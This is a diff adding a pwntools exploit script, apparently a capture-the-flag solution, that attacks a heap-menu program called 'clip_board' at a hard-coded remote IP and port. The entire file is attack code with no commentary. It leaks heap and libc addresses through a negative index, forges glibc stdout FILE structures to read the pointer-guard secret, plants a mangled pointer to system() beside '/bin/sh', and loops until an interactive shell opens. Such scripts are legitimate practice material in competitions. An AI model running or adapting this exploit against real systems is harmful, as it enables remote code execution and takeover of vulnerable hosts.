@@ -1,0 +1,126 @@
+from pwn import *
+
+for i in range(0,100):
+    print(i)
+    p = remote("43.201.64.101", 8888)
+    #p = process("clip_board")
+
+    x = -0x1000 * i
+
+    def command_add(idx, size, content):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'>', str(idx).encode())
+        p.sendlineafter(b'>', str(size).encode())
+        p.sendlineafter(b'>', content)
+
+    def command_view(idx):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'>', str(idx).encode())
+
+    def command_del(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'>', str(idx).encode())
+
+    def rol(n, r):
+        return ((n << r) | (n >> (64 - r))) & 0xFFFFFFFFFFFFFFFF
+
+    p.recvuntil(b'0x')
+    heap_base = int(p.recvn(12),16) - 0x2a0
+    print(f'heap_base = {hex(heap_base)}')
+
+    # add
+    command_add(9,256,b'a')
+    command_add(1,256,b'a')
+    command_view(-4)
+
+    #0x750f8
+    #751C8
+    libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x21a803
+    print(f'libc_base = {hex(libc_base)}')
+
+    command_del(1)
+    command_del(9)
+
+    command_add(0,256,b'/bin/sh\x00') 
+    heap = heap_base + 0x2d0
+
+    # 7F830 execute
+    # _IO_do_write
+
+    stdout_struct = b''
+    stdout_struct += p64(0xfbad1800)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x268ab0+x) # start
+    stdout_struct += p64(libc_base+0x268ab0+8+x) # end
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803+1)
+    stdout_struct += p64(0) * 4
+    stdout_struct += p64(libc_base+0x219aa0)
+    stdout_struct += p64(1)
+    stdout_struct += p64(0xffffffffffffffff)
+    stdout_struct += p64(0x000000000a000000)
+    stdout_struct += p64(libc_base+0x21ba70)
+    stdout_struct += p64(0xffffffffffffffff)
+    stdout_struct += p64(0)
+    stdout_struct += p64(libc_base+0x2199a0)
+    stdout_struct += p64(0) * 3
+    stdout_struct += p64(0x00000000ffffffff) 
+    stdout_struct += p64(0) * 2
+    stdout_struct += p64(libc_base+0x216600)
+    stdout_struct += p64(libc_base+0x21a6a0)
+    stdout_struct += p64(libc_base+0x21a780)
+    stdout_struct += p64(libc_base+0x219aa0)
+    stdout_struct += p64(libc_base+0x269040)
+
+    command_add(-4,256,stdout_struct)
+    p.recvn(1)
+    rand_val = u64(p.recvn(8))
+    print(f'rand_val = {hex(rand_val)}')
+
+    command_add(9,10,b'a')
+    command_del(9)
+
+    stdout_struct = b''
+    stdout_struct += p64(0xfbad1800)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x221200) # start
+    stdout_struct += p64(libc_base+0x221200+8) # end
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803)
+    stdout_struct += p64(libc_base+0x21a803+1)
+    stdout_struct += p64(0) * 4
+    stdout_struct += p64(libc_base+0x219aa0)
+    stdout_struct += p64(1)
+    stdout_struct += p64(0xffffffffffffffff)
+    stdout_struct += p64(0x000000000a000000)
+    stdout_struct += p64(libc_base+0x21ba70)
+    stdout_struct += p64(0xffffffffffffffff)
+    stdout_struct += p64(0)
+    stdout_struct += p64(libc_base+0x2199a0)
+    stdout_struct += p64(0) * 3
+    stdout_struct += p64(0x00000000ffffffff) 
+    stdout_struct += p64(0) * 2
+    stdout_struct += p64(libc_base+0x215c00-0x38)
+    stdout_struct += p64(heap)
+    stdout_struct += p64(libc_base+0x21a780)
+    stdout_struct += p64(libc_base+0x219aa0)
+    stdout_struct += p64(rol((libc_base+0x50d60)^rand_val,0x11))
+
+    command_add(-4,256,stdout_struct)
+
+
+    try:
+        p.sendline(b'echo abcdabcd')
+        p.sendline(b'echo abcdabcd')
+        p.sendline(b'echo abcdabcd')
+
+        if b'abcdabcd' in p.recvuntil(b'abcdabcd',timeout = 1):
+            break
+    except:
+        pass
+p.interactive()
